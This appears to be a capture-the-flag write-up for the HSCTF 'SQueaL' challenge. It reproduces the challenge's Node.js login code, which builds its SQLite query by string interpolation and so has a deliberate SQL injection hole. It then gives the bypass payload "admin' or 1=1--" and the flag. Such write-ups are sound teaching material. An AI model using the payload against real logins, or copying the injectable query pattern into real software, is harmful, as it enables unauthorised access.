Title: SQueaL <br>
Desc: Can you log into this super secret site as admin? It's okay to SQueaL <br>
Target: https://hsctf-9-resources.storage.googleapis.com/uploads/5b0a2589465ae79fac4f1405f3c94061c5e11d591bebcfa5e5de762863e01f19/squeal.zip (squeal.zip) <br>
http://web1.hsctf.com:8006/

The website will prompt a login box which refers to the description, is an admin login site. Thus, the goal is to bypass the login security.
![image](https://user-images.githubusercontent.com/63649797/173056014-7e684d24-940f-4c72-9eaa-255728c41100.png)
<br><br>

The squeal.zip also includes the source code of the website including the javascript file that handles the login system.
```
//index.js
const express = require("express");
const db = require("better-sqlite3")("db.sqlite3");
const app = express();

app.use(express.json());

app.post("/api/flag", (req, res) => {
	const username = req.body.username;
	const password = req.body.password;
	if (typeof username !== "string") {
		res.status(400);
		res.end();
		return;
	}
	if (typeof password !== "string") {
		res.status(400);
		res.end();
		return;
	}

	let result;
	try {
		result = db
			.prepare(
				`SELECT * FROM users
            WHERE username = '${username}'
            AND password = '${password}';`
			)
			.get();
	} catch (error) {
		res.json({ success: false, error: "There was a problem." });
		res.end();
		return;
	}

	if (result) {
		res.json({ success: true, flag: process.env.FLAG });
		res.end();
		return;
	}

	res.json({ success: false, error: "Incorrect username or password." });
});

app.use(express.static("/app/public"));
app.listen(process.env.PORT || 3000);

db.prepare(
	`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT);`
).run();
db.prepare(
	`INSERT INTO
    users (username, password)
    VALUES ('${process.env.USERNAME}', '${process.env.PASSWORD}');`
).run();
```

```
//script.js
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });
    const form = document.getElementById('login');
    form.addEventListener('submit', async (event) => {
        event.preventDefault();
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const res = await fetch('/api/flag', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({username, password}),
        });
        if (res.status !== 200) {
            return;
        }
        const json = await res.json();
        if (! json) {
            return;
        }
        if (json.success) {
            alert(json.flag);
            return;
        }
        alert(json.error);
    });
})();
```
<br>
Through index.js, I can see that the running SQL service is SQLite3. The script.js also gives a clue that a javascript alert containing a flag will appear when the credential submitted is correct. <br><br>

The SQL query that confirm the credential is on index js 
``
(`SELECT * FROM users WHERE username = '${username}' AND password = '${password}';`)
``
<br>

From here, I know that to comment a query in SQLite, I can simply using a double dash (--). So, we can manipulate the query to inject the username field with ``admin' or 1=1--``
<br>
The comment is generally useful for ignoring rest of the query so you I don't have to deal with the password field. And since the admin credential is the target, we can put admin as a username.

Hence, the flag alert will prompt after the payload is injected. <br>
![image](https://user-images.githubusercontent.com/63649797/173054846-a43fbb96-1e86-46d1-a50d-bc6b485ea720.png)
<br><br>

Flag
```
flag{squ34l_n0t_sql}
```
